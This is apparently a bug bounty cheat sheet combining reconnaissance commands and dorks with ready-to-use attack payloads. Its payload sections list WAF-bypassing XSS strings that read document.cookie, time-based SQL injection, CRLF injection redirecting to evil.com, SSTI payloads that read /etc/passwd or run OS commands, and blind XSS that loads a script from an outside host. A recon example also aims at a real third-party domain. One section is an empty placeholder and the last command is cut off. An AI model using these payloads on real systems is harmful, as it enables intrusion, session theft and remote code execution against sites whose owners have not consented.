---
title: "Hunt BugBounty CheatSheet"
categories: [Notes,BugBounty]
tags: [BugBounty]
render_with_liquid: false

---

# Subdomain Enumeration

## Basic Subdomain Discovery

Discovers subdomains using subfinder with recursive enumeration and
saves results to a file.

``` bash
subfinder -d example.com -all -recursive > subexample.com.txt
```

## Live Subdomain Filtering

Filters discovered subdomains using httpx and saves the alive ones to a
file.

``` bash
cat subexample.com.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 > subexample.coms_alive.txt
```

## Subdomain Takeover Check

Checks for subdomain takeover vulnerabilities using subzy.

``` bash
subzy run --targets subexample.coms.txt --concurrency 100 --hide_fails --verify_ssl
```

# URL Collection

## Passive URL Collection

Collects URLs from various sources and saves them to a file.

``` bash
katana -u subexample.coms_alive.txt -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o allurls.txt
```

## Advanced URL Fetching

Collects URLs from various sources and saves them to a file.

``` bash
echo example.com | katana -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -f qurl | urldedupe >output.txt
katana -u https://example.com -d 5 | grep '=' | urldedupe | anew output.txt
cat output.txt | sed 's/=.*/=/' >final.txt
```

## GAU URL Collection

Collects URLs using GAU and saves them to a file.

``` bash
echo example.com | gau --mc 200 | urldedupe >urls.txt
cat urls.txt | grep -E ".php|.asp|.aspx|.jspx|.jsp" | grep '=' | sort > output.txt
cat output.txt | sed 's/=.*/=/' >final.txt
```

# Sensitive Data Discovery

## Sensitive File Detection

Detects sensitive files on the web server.

``` bash
cat allurls.txt | grep -E "\.xls|\.xml|\.xlsx|\.json|\.pdf|\.sql|\.doc|\.docx|\.pptx|\.txt|\.zip|\.tar\.gz|\.tgz|\.bak|\.7z|\.rar|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.gz|\.config|\.csv|\.yaml|\.md|\.md5"
```

## Information Disclosure Dork

Searches for information disclosure vulnerabilities using a dork.

``` text
site:*.example.com (ext:doc OR ext:docx OR ext:odt OR ext:pdf OR ext:rtf OR ext:ppt OR ext:pptx OR ext:csv OR ext:xls OR ext:xlsx OR ext:txt OR ext:xml OR ext:json OR ext:zip OR ext:rar OR ext:md OR ext:log OR ext:bak OR ext:conf OR ext:sql)
```

## Git Repository Detection

Detects Git repositories on the web server.

``` bash
cat example.coms.txt | grep "SUCCESS" | gf urls | httpx-toolkit -sc -server -cl -path "/.git/" -mc 200 -location -ms "Index of" -probe
```

## Information Disclosure Scanner

Checks for information disclosure vulnerabilities using a scanner.

``` bash
echo https://example.com | gau | grep -E "\.(xls|xml|xlsx|json|pdf|sql|doc|docx|pptx|txt|zip|tar\.gz|tgz|bak|7z|rar|log|cache|secret|db|backup|yml|gz|config|csv|yaml|md|md5|tar|xz|7zip|p12|pem|key|crt|csr|sh|pl|py|java|class|jar|war|ear|sqlitedb|sqlite3|dbf|db3|accdb|mdb|sqlcipher|gitignore|env|ini|conf|properties|plist|cfg)$"
```

## AWS S3 Bucket Finder

Searches for AWS S3 buckets associated with the target.

``` bash
s3scanner scan -d example.com
```

## API Key Finder

Searches for exposed API keys and tokens in JavaScript files.

``` bash
cat allurls.txt | grep -E "\.js$" | httpx-toolkit -mc 200 -content-type | grep -E "application/javascript|text/javascript" | cut -d' ' -f1 | xargs -I% curl -s % | grep -E "(API_KEY|api_key|apikey|secret|token|password)"
```

# XSS Testing

## XSS Hunting Pipeline

Collects XSS vulnerabilities using various tools and saves them to a
file.

``` bash
echo https://example.com/ | gau | gf xss | uro | Gxss | kxss | tee xss_output.txt
```

## XSS with Dalfox

Uses Dalfox to scan for XSS vulnerabilities.

``` bash
cat xss_params.txt | dalfox pipe --blind https://your-collaborator-url --waf-bypass --silence
```

## Stored XSS Finder

Finds potential stored XSS vulnerabilities by scanning forms.

``` bash
cat urls.txt | grep -E "(login|signup|register|forgot|password|reset)" | httpx -silent | nuclei -t nuclei-templates/vulnerabilities/xss/ -severity critical,high
```

## DOM XSS Detection

Detects potential DOM-based XSS vulnerabilities.

``` bash
cat js_files.txt | Gxss -c 100 | sort -u | dalfox pipe -o dom_xss_results.txt
```

# LFI Testing

## LFI Methodology

Tests for Local File Inclusion (LFI) vulnerabilities using various
methods.

``` bash
echo "https://example.com/" | gau | gf lfi | uro | sed 's/=.*/=/' | qsreplace "FUZZ" | sort -u | xargs -I{} ffuf -u {} -w payloads/lfi.txt -c -mr "root:(x|\*|\$[^\:]*):0:0:" -v
```

# CORS Testing

## Basic CORS Check

``` bash
curl -H "Origin: http://example.com" -I https://example.com/wp-json/
```

## CORScanner

``` bash
python3 CORScanner.py -u https://example.com -d -t 10
```

## CORS Nuclei Scan

``` bash
cat example.coms.txt | httpx -silent | nuclei -t nuclei-templates/vulnerabilities/cors/ -o cors_results.txt
```

## CORS Origin Reflection Test

``` bash
curl -H "Origin: https://evil.com" -I https://example.com/api/data | grep -i "access-control-allow-origin: https://evil.com"
```

# WordPress Scanning

## Aggressive WordPress Scan

``` bash
wpscan --url https://example.com --disable-tls-checks --api-token YOUR_TOKEN -e at -e ap -e u --enumerate ap --plugins-detection aggressive --force
```

# Network Scanning

## Naabu Scan

``` bash
naabu -list ip.txt -c 50 -nmap-cli 'nmap -sV -SC' -o naabu-full.txt
```

## Nmap Full Scan

``` bash
nmap -p- --min-rate 1000 -T4 -A example.com -oA fullscan
```

## Masscan

``` bash
masscan -p0-65535 example.com --rate 100000 -oG masscan-results.txt
```

# Parameter Discovery

## Arjun Passive

``` bash
arjun -u https://example.com/endpoint.php -oT arjun_output.txt -t 10 --rate-limit 10 --passive -m GET,POST --headers "User-Agent: Mozilla/5.0"
```

## Arjun Wordlist

``` bash
arjun -u https://example.com/endpoint.php -oT arjun_output.txt -m GET,POST -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -t 10 --rate-limit 10 --headers "User-Agent: Mozilla/5.0"
```

# JavaScript Analysis

## JS File Hunting

``` bash
echo example.com | katana -d 5 | grep -E "\.js$" | nuclei -t /path/to/nuclei-templates/http/exposures/ -c 30
```

## JS File Analysis

``` bash
cat alljs.txt | nuclei -t /path/to/nuclei-templates/http/exposures/
```

# Content Type Filtering

## Content Type Check

``` bash
echo example.com | gau | grep -Eo '(\/[^\/]+)\.(php|asp|aspx|jsp|jsf|cfm|pl|perl|cgi|htm|html)$' | httpx -status-code -mc 200 -content-type | grep -E 'text/html|application/xhtml+xml'
```

## JavaScript Content Check

``` bash
echo example.com | gau | grep '\.js-php-jsp-other extens$' | httpx -status-code -mc 200 -content-type | grep 'application/javascript'
```

# Shodan Dorks

## SSL Certificate Search

``` text
Ssl.cert.subject.CN:"example.com" 200
```

# FFUF Request File Method

## LFI with Request File

``` bash
ffuf -request lfi -request-proto https -w /root/wordlists/offensive\ payloads/LFI\ payload.txt -c -mr "root:"
```

## XSS with Request File

``` bash
ffuf -request xss -request-proto https 
```


# Advanced Bug Bounty Methodologies

- [Advanced Recon Methodology](#advanced-recon-methodology)
- [Gather Assets Through API](#gather-assets-through-api)
- [SSTI Payloads](#ssti-payloads)
- [CRLF Injection](#crlf-injection)
- [SQL Injection Methodology](#sql-injection-methodology)
- [XSS WAF Bypass Methodology](#xss-waf-bypass-methodology)
- [SQL Injection XOR WAF Bypass](#sql-injection-xor-waf-bypass-methodology)
- [Advanced Google Dorks](#advanced-google-dorks-methodology)



## Advanced Google Dorks Methodology

### Basic Domain Reconnaissance
*Basic domain enumeration using Google dorks*

```bash
site:example.com -www -shop -share -ir -mfa
site:example.com ext:php inurl:?
site:example.com inurl:api | site:*/rest | site:*/v1 | site:*/v2 | site:*/v3
```

### Sensitive File Extensions
*Search for potentially sensitive file extensions*

```bash
site:'example.com' ext:log | ext:txt | ext:conf | ext:cnf | ext:ini | ext:env | ext:sh | ext:bak | ext:backup | ext:swp | ext:old | ext:~ | ext:git | ext:svn | ext:htpasswd | ext:htaccess | ext:json
inurl:conf | inurl:env | inurl:cgi | inurl:bin | inurl:etc | inurl:root | inurl:sql | inurl:backup | inurl:admin | inurl:php site:example.com
```

### Error Pages and Exceptions
*Find pages exposing error messages or exceptions*

```bash
inurl:'error' | intitle:'exception' | intitle:'failure' | intitle:'server at' | inurl:exception | 'database error' | 'SQL syntax' | 'undefined index' | 'unhandled exception' | 'stack trace' site:example.com
```

### Vulnerability-Prone Parameters
*Search for potentially vulnerable parameters*

```bash
inurl:q= | inurl:s= | inurl:search= | inurl:query= | inurl:keyword= | inurl:lang= inurl:& site:example.com
inurl:url= | inurl:return= | inurl:next= | inurl:redirect= | inurl:redir= | inurl:ret= | inurl:r2= | inurl:page= inurl:& inurl:http site:example.com
inurl:id= | inurl:pid= | inurl:category= | inurl:cat= | inurl:action= | inurl:sid= | inurl:dir= inurl:& site:example.com
inurl:http | inurl:url= | inurl:path= | inurl:dest= | inurl:html= | inurl:data= | inurl:domain= | inurl:page= inurl:& site:example.com
inurl:include | inurl:dir | inurl:detail= | inurl:file= | inurl:folder= | inurl:inc= | inurl:locate= | inurl:doc= | inurl:conf= inurl:& site:example.com
inurl:cmd | inurl:exec= | inurl:query= | inurl:code= | inurl:do= | inurl:run= | inurl:read= | inurl:ping= inurl:& site:example.com
```

### Cloud Storage and Services
*Find exposed cloud storage and services*

```bash
site:s3.amazonaws.com 'example.com'
site:blob.core.windows.net 'example.com'
site:googleapis.com 'example.com'
site:drive.google.com 'example.com'
site:dev.azure.com 'example.com'
site:onedrive.live.com 'example.com'
site:digitaloceanspaces.com 'example.com'
site:sharepoint.com 'example.com'
site:s3-external-1.amazonaws.com 'example.com'
site:s3.dualstack.us-east-1.amazonaws.com 'example.com'
site:dropbox.com/s 'example.com'
site:box.com/s 'example.com'
site:docs.google.com inurl:'/d/' 'example.com'
site:jfrog.io 'example.com'
site:firebaseio.com 'example.com'
```

### Code and Documentation
*Search for exposed code and documentation*

```bash
site:pastebin.com 'example.com'
site:jsfiddle.net 'example.com'
site:codebeautify.org 'example.com'
site:codepen.io 'example.com'
inurl:apidocs | inurl:api-docs | inurl:swagger | inurl:api-explorer site:'example.com'
site:openbugbounty.org inurl:reports intext:'example.com'
site:groups.google.com 'example.com'
```

### Sensitive Content
*Find potentially sensitive content*

```bash
site:example.com 'choose file'
inurl:login | inurl:signin | intitle:login | intitle:signin | inurl:secure site:example.com
inurl:test | inurl:env | inurl:dev | inurl:staging | inurl:sandbox | inurl:debug | inurl:temp | inurl:internal | inurl:demo site:example.com
site:example.com ext:txt | ext:pdf | ext:xml | ext:xls | ext:xlsx | ext:ppt | ext:pptx | ext:doc | ext:docx
intext:'confidential' | intext:'Not for Public Release' | intext:'internal use only' | intext:'do not distribute'
inurl:email= | inurl:phone= | inurl:password= | inurl:secret= inurl:& site:example.com
```

**Tips:**
- Replace `example.com` with your target domain.
- Use `[.]` notation to avoid Google auto-linking.
- Combine dorks for specific results.
- Use quotes for exact matches.
- Monitor results over time for new exposures.
- Document all findings systematically.
- Verify before reporting.
- Be mindful of scope and authorization boundaries.
- Use `-site:` to exclude irrelevant results.
- Consider time-based filters for recent exposures.

---

## SQL Injection XOR WAF Bypass Methodology

### Time-Based XOR Payloads
*XOR-based payloads using sleep functions for blind SQL injection*

```sql
'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
X'XOR(if(now()=sysdate(),//sleep(10)//,0))XOR'X
X'XOR(if(now()=sysdate(),(sleep(10)),0))XOR'X
0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
0'XOR(if(now()=sysdate(),sleep(10*1),0))XOR'Z
XOR(if(now()=sysdate(),sleep(7),0))XOR%23
```

### Nested Query XOR Payloads
*Complex nested queries with XOR operations for WAF evasion*

```sql
X'XOR(if((select now()=sysdate()),BENCHMARK(10000000,md5('xyz')),0))XOR'X
'XOR(SELECT(0)FROM(SELECT(SLEEP(10)))a)XOR'Z
(SELECT(0)FROM(SELECT(SLEEP(10)))a)'XOR(if(now()=sysdate(),sleep(10),0))OR'
'%2b(select*from(select(sleep(10)))a)%2b'
1'%2b(select*from(select(sleep(10)))a)%2b'
```

### Conditional XOR Payloads
*XOR payloads with conditional logic for WAF bypass*

```sql
'OR (CASE WHEN ((CLOCK_TIMESTAMP() - NOW()) < '0:0:10') THEN (SELECT '1'||PG_SLEEP(10)) ELSE '0' END)='1
if(now()=sysdate(),sleep(10),0)/'XOR(if(now()=sysdate(),sleep(10),0))OR'
if(now()=sysdate(),sleep(10),0)/'XOR(if(now()=sysdate(),sleep(10),0))OR''XOR(if(now()=sysdate(),sleep(10),0) and 1=1)'/
'%20and%20(select%20%20from%20(select(if(substring(user(),1,1)='p',sleep(10),1)))a)--%20
```

**Tips:**
- Rotate payloads to avoid detection.
- Adjust sleep times for response patterns.
- Use selective URL encoding.
- Combine XOR with other SQL ops.
- Test payloads with varied string terminators.
- Monitor response times carefully.
- Use nested queries for bypass.
- Match payloads to DB type.

---

## XSS WAF Bypass Methodology

### Akamai WAF Bypasses

```html
';k='e'%0Atop['al'+k+'rt'](1)//
'><A HRef=' AutoFocus OnFocus=top//?.['ale'%2B'rt'](1)>
```

### CloudFlare WAF Bypasses

```html
<svg/onload=window['al'+'ert']1337>
<Svg Only=1 OnLoad=confirm(document.cookie)>
<svg onload=alert&#0000000040document.cookie)>
%3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E
<sVG/oNLY%3d1//On+ONloaD%3dco\u006efirm%26%23x28%3b%26%23x29%3b>
<Img Src=//X55.is OnLoad%0C=import(Src)>
<Img Src=OnXSS OnError=prompt(1337)>
<Img Src=OnXSS OnError=prompt(document.cookie)>
<Svg Only=1 OnLoad=confirm(atob('Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=='))>
```

### Cloudfront WAF Bypasses

```html
'>'><details/open/ontoggle=confirm('XSS')>
6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/
';window/aabb/['al'%2b'ert'](document./aabb/location);//
'>%0D%0A%0D%0A<x '='foo'><x foo='><img src=x onerror=javascript:alert(cloudfrontbypass)//>'>
```

### ModSecurity WAF Bypasses

```html
<svg onload='new Function['Y000!'].find(al\u0065rt)'>
```

### Imperva WAF Bypasses

```html
<Img Src=//X55.is OnLoad%0C=import(Src)>
<sVg OnPointerEnter='location=javas+cript:ale+rt%2+81%2+9;//</div'>
<details ... ontoggle=&#x0000000000061;lert&#x000000028;origin&#x000029;>
<details ... ontoggle='propmt(document.cookie);'>
```

### Sucuri WAF Bypasses

```html
<A HREF='https://www.cia.gov/'>Click Here </A>
'><img src=x onerror=alert(document.cookie)>
<button onClick='prompt(1337)'>Submit</button>
<a href=j&#97v&#97script&#x3A;&#97lert(1337)>ClickMe
<a href=j&#97v&#97script&#x3A;&#97lert(document.cookie)>ClickMe
<a href='j&#97;vascript&#x3A;&#97;lert('Sucuri WAF Bypassed ! ' + document.domain + '\nCookie: ' + document.cookie);'>ClickMe</a>
```

**Tips:**
- Test payloads against specific WAF versions.
- Mix encodings and event handlers.
- Verify in context of target.
- Document successful bypasses.

---

## SQL Injection Methodology

(Commands and payloads for SQLi testing — consolidated as in user-provided dataset.)

---

## CRLF Injection

### Payloads

#### Basic injection payload to test for CRLF vulnerabilities (extra headers/HTML)
```bash
%0d%0a%0d%0a%3Ch1%3ECoffinxp%3C%2Fh1%3E%0A%3Cp%3ECRLF%20Injection%20PoC%3C%2Fh1%3E
```

#### Bypass headers like X-XSS-Protection and inject scripts
```bash
%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.cookie%29%3C/script%3E
```

#### Redirect victim via injected response
```bash
%0d%0a%0d%0a%3Cscript%3Edocument.location.href%3D%22https%3A%2F%2Fevil.com%22%3C%2Fscript%3E
```

#### Script execution in SVG with crafted Content-Length
```bash
%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a%0d%0a/%2f%2e%2e
```

#### Image onerror prompt
```bash
%0d%0a%0d%0a%3Cimg%20src%3Dx%20onerror%3Dprompt%281%29%3E
```

#### Full-screen iframe overlay
```bash
%0d%0a%0d%0a%3Ciframe%20src%3D%22https%3A%2F%2Fwww.nasa.gov%2F%22%20style%3D%22border%3A%200%3B%20position%3Afixed%3B%20top%3A0%3B%20left%3A0%3B%20right%3A0%3B%20bottom%3A0%3B%20width%3A100%25%3B%20height%3A100%25%22%3E%0A
```

#### Phishing anchor
```bash
%0d%0a%0d%0a%3CA%20HREF%3D%22https%3A%2F%2Fwww.cia.gov%2F%22%3ELogin%20Here%20%3C%2FA%3E%0A%0A
```

### Tips
- Encode payloads properly; avoid breaking application parsing.
- Use Burp Suite or similar to inject into headers and params.
- Test many headers (Location, Set-Cookie, Content-Type, etc.).
- Combine CRLF with XSS/Open Redirect for impact.
- Document which inputs/headers were vulnerable and reproduction steps.


## SSTI Payloads

### Basic Template Detection
*Initial payloads to detect template injection vulnerabilities*

```bash
[=7*7]
{7*7}
*{7*7}
[[3*3]]
@(3*3)
${= 3*3}
{{ '7'*7 }}
{{= 7*7}}
{{2*2}}[[3*3]]
{{3*3}}
{{3*'3'}}
<%= 3 * 3 %>
${6*6}
${{3*3}}
@(6+5)
#{3*3}
#{ 3 * 3 }
{% debug %}
{{'a'.toUpperCase()}}
```

### Information Disclosure
*Payloads to extract configuration and application data*

```bash
{{dump(app)}}
{{app.request.server.all|join(',')}}
{{config.items()}}
{{ request }}
{$smarty.version}
{{request.class}}
{{request|attr('class')}}
{{self}}
{% debug %}
```

### Python-Specific Exploits
*Payloads targeting Python-based template engines*

```bash
{{ [].class.base.subclasses() }}
{{''.class.mro()[1].subclasses()}}
{{ ''.class.mro[2].subclasses() }}
{{''.class.base.subclasses()}}
{{''.class.base.subclasses()[227]('cat /etc/passwd', shell=True, stdout=-1).communicate()}}
{{ ''.class.mro[2].subclasses()[40]('/etc/passwd').read() }}
{{ config.items()[4][1].class.mro[2].subclasses()[40]('/etc/passwd').read() }}
{{config.class.init.globals['os'].popen('ls').read()}}
{% for x in ().class.base.subclasses() %}{% if "warning" in x.name %}{{x()._module.builtins['import']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
```

### Java Template Exploits
*Payloads specifically for Java-based template engines*

```bash
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval("new java.lang.String('xxx')")}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval("var x=new java.lang.ProcessBuilder; x.command(\"whoami\"); x.start()")}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval("var x=new java.lang.ProcessBuilder; x.command(\"netstat\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())")}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval("var x=new java.lang.ProcessBuilder; x.command(\"uname\",\"-a\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())")}}
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
${"freemarker.template.utility.Execute"?new()("id")}
```

### Filter Bypass Techniques
*Advanced payloads for bypassing security filters*

```bash
{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}
{{request|attr(["_"*2,"class","_"*2]|join)}}
{{request|attr(["","class",""]|join)}}
{{['id']|filter('system')}}
{{['cat\x20/etc/passwd']|filter('system')}}
{{['cat$IFS/etc/passwd']|filter('system')}}
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

### Ruby Template Exploits

```bash
<%= File.open('/etc/passwd').read %>
{php}echo id;{/php}
```

**Tips**
- Start with basic detection payloads before attempting complex exploits.
- Different template engines require different payload structures.
- Watch for error messages that reveal the template engine.
- Use URL encoding to bypass WAF and input filters.
- Test payloads in parameters, forms, headers, and cookies.
- Document successful payloads per engine.
- Be cautious with RCE payloads in production.
- Monitor response times for blind SSTI.
- Try encoding variations to evade filters.


## Gather Assets Through API

### Commands

#### VirusTotal — Domain report (subdomains, IPs)
```bash
https://www.virustotal.com/vtapi/v2/domain/report?apikey=<api_key>&domain=<DOMAIN>
```

#### VirusTotal — Extract IP addresses
```bash
curl -s "https://www.virustotal.com/vtapi/v2/domain/report?domain=<DOMAIN>&apikey=<api_key>" | jq -r '.. | .ip_address? // empty' | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}'
```

#### VirusTotal — Extract subdomains
```bash
curl -s "https://www.virustotal.com/vtapi/v2/domain/report?apikey=<api_key>&domain=<DOMAIN>" | jq -r '.domain_siblings[]'
```

#### AlienVault OTX — Extract IPs from URL list
```bash
curl -s "https://otx.alienvault.com/api/v1/indicators/hostname/<DOMAIN>/url_list?limit=500&page=1" | jq -r '.url_list[]?.result?.urlworker?.ip // empty' | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}'
```

#### URLScan.io — Extract IPs from results
```bash
curl -s "https://urlscan.io/api/v1/search/?q=domain:<DOMAIN>&size=10000" | jq -r '.results[]?.page?.ip // empty' | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}'
```

#### Wayback Machine — Historical URLs
```bash
https://web.archive.org/cdx/search/cdx?url=<DOMAIN>&fl=original&collapse=urlkey
```

#### Shodan — Search by favicon hash
```bash
http.favicon.hash:1265477436
```

#### Shodan — SSL CN search and verify with httpx
```bash
shodan search Ssl.cert.subject.CN:"<DOMAIN>" 200 --fields ip_str | httpx-toolkit -sc -title -server -td
```

#### Nmap — Inspect SSL certificate on a host
```bash
nmap --script ssl-cert -p 443 <IP Address>
```

### Tips
- Replace `<api_key>` and `<DOMAIN>` accordingly; watch API rate limits.
- Some APIs require paid tiers/auth; cache results to stay within limits.
- Prefer `jq` for JSON parsing; combine multiple sources to cross-validate.
- Document each API’s findings (IPs, subdomains, URLs) and verification.


## Advanced Recon Methodology

### Steps & Commands

#### 1) Subdomain discovery
```bash
subfinder -d example.com -all -recursive > subdomain.txt
```

#### 2) Alive filtering
```bash
cat subdomain.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 > subdomains_alive.txt
```

#### 3) Passive URLs
```bash
katana -u subdomains_alive.txt -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o allurls.txt
```

#### 4) Sensitive files
```bash
cat allurls.txt | grep -E '\.xls|\.xml|\.xlsx|\.json|\.pdf|\.sql|\.doc|\.docx|\.pptx|\.txt|\.zip|\.tar\.gz|\.tgz|\.bak|\.7z|\.rar|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.gz|\.config|\.csv|\.yaml|\.md|\.md5'
```

#### 5–9) URL fetching & normalization
```bash
echo example.com | katana -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -f qurl | urldedupe >output.txt
katana -u https://example.com -d 5 | grep '=' | urldedupe | anew output.txt
cat output.txt | sed 's/=.*/=/' >final.txt
echo example.com | gau --mc 200 | urldedupe >urls.txt
cat urls.txt | grep -E '.php|.asp|.aspx|.jspx|.jsp' | grep '=' | sort > output.txt
cat output.txt | sed 's/=.*/=/' >final.txt
```

#### 10–11) Hidden parameter discovery (Arjun)
```bash
arjun -u https://site.com/endpoint.php -oT arjun_output.txt -t 10 --rate-limit 10 --passive -m GET,POST --headers 'User-Agent: Mozilla/5.0'
arjun -u https://site.com/endpoint.php -oT arjun_output.txt -m GET,POST -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -t 10 --rate-limit 10 --headers 'User-Agent: Mozilla/5.0'
```

#### 12–13) CORS checks
```bash
curl -H 'Origin: http://example.com' -I https://etoropartners.com/wp-json/
curl -H 'Origin: http://example.com' -I https://etoropartners.com/wp-json/ | grep -i -e 'access-control-allow-origin' -e 'access-control-allow-methods' -e 'access-control-allow-credentials'
```

#### 14) Info disclosure dorks
```bash
site:*.example.com (ext:doc OR ext:docx OR ext:odt OR ext:pdf OR ext:rtf OR ext:ppt OR ext:pptx OR ext:csv OR ext:xls OR ext:xlsx OR ext:txt OR ext:xml OR ext:json OR ext:zip OR ext:rar OR ext:md OR ext:log OR ext:bak OR ext:conf OR ext:sql)
```

#### 15) WordPress aggressive scan
```bash
wpscan --url https://site.com --disable-tls-checks --api-token <here> -e at -e ap -e u --enumerate ap --plugins-detection aggressive --force
```

#### 16 & 36) LFI methodologies
```bash
echo 'https://example.com/' | gau | gf lfi | uro | sed 's/=.*/=/' | qsreplace 'FUZZ' | sort -u | xargs -I{} ffuf -u {} -w payloads/lfi.txt -c -mr 'root:(x|\*|\$[^\:]*):0:0:' -v
echo 'https://example.com/index.php?page=' | httpx-toolkit -paths payloads/lfi.txt -threads 50 -random-agent -mc 200 -mr 'root:(x|\*|\$[^\:]*):0:0:'
```

#### 17–18) Directory brute force
```bash
dirsearch -u https://example.com -e php,cgi,htm,html,shtm,shtml,js,txt,bak,zip,old,conf,log,pl,asp,aspx,jsp,sql,db,sqlite,mdb,tar,gz,7z,rar,json,xml,yml,yaml,ini,java,py,rb,php3,php4,php5 --random-agent --recursive -R 3 -t 20 --exclude-status=404 --follow-redirects --delay=0.1
ffuf -w seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u https://example.com/FUZZ -fc 400,401,402,403,404,429,500,501,502,503 -recursion -recursion-depth 2 -e .html,.php,.txt,.pdf,.js,.css,.zip,.bak,.old,.log,.json,.xml,.config,.env,.asp,.aspx,.jsp,.gz,.tar,.sql,.db -ac -c -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'X-Forwarded-For: 127.0.0.1' -H 'X-Originating-IP: 127.0.0.1' -H 'X-Forwarded-Host: localhost' -t 100 -r -o results.json
```

#### 19–20) JS file exposures
```bash
echo example.com | katana -d 5 | grep -E '\.js$' | nuclei -t nuclei-templates/http/exposures/ -c 30
cat alljs.txt | nuclei -t /home/coffinxp/nuclei-templates/http/exposures/
```

#### 21–23) Subdomain takeover & CORS
```bash
subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_ssl
python3 corsy.py -i subdomains_alive.txt -t 10 --headers 'User-Agent: GoogleBot\nCookie: SESSION=Hacked'
```

#### 24–25) XSS (single & blind)
```bash
subfinder -d example.com | gau | bxss -payload ''><script src=https://xss.report/c/coffinxp></script>' -header 'X-Forwarded-For'
echo 'example.com ' | gau | qsreplace '<sCript>confirm(1)</sCript>' | xsschecker -match '<sCript>confirm(1)</sCript>' -vuln
subfinder -d example.com | gau | grep '&' | bxss -appendMode -payload ''><script src=https://xss.report/c/coffinxp></script>' -parameters
```

#### 26–27) Content-type filter & Shodan dork
```bash
echo domain | gau | grep -Eo '(\/[^\/]+)\.(php|asp|aspx|jsp|jsf|cfm|pl|perl|cgi|htm|html)$' | httpx -status-code -mc 200 -content-type | grep -E 'text/html|application/xhtml+xml'
Ssl.cert.subject.CN:'example.com' 200
```

#### 28–29) XSS pipeline
```bash
echo https://example.com/ | gau | gf xss | uro | Gxss | kxss | tee xss_output.txt
cat xss_output.txt | grep -oP '^URL: \K\S+' | sed 's/=.*/=/' | sort -u > final.txt
```

#### 30–32) Network scanning
```bash
naabu -list ip.txt -c 50 -nmap-cli 'nmap -sV -SC' -o naabu-full.txt
nmap -p- --min-rate 1000 -T4 -A target.com -oA fullscan
masscan -p0-65535 target.com --rate 100000 -oG masscan-results.txt
```

#### 33–35) FFUF request files & header-based XSS/SSRF
```bash
ffuf -request lfi -request-proto https -w /root/wordlists/offensive\ payloads/LFI\ payload.txt -c -mr 'root:'
ffuf -request xss -request-proto https -w /root/wordlists/xss-payloads.txt -c -mr '<script>alert('XSS')</script>'
cat domains.txt | assetfinder --subs-only| httprobe | while read url; do xss1=$(curl -s -L $url -H 'X-Forwarded-For: xss.yourburpcollabrotor'|grep xss) xss2=$(curl -s -L $url -H 'X-Forwarded-Host: xss.yourburpcollabrotor'|grep xss) xss3=$(curl -s -L $url -H 'Host: xss.yourburpcollabrotor'|grep xss) xss4=$(curl -s -L $url --request-target http://burpcollaborator/ --max-time 2); echo -e '\e[1;32m$url\e[0m'"\n"'Method[1] X-Forwarded-For: xss+ssrf => '$xss1"\n"'Method[2] X-Forwarded-Host: xss+ssrf ==...
```

### Tips
- Verify live subdomains before heavy scans; use rate limiting.
- Combine passive and active recon for depth.
- Look for misconfigurations in cloud services and public files.
- Verify each potential vuln before reporting; keep thorough notes.

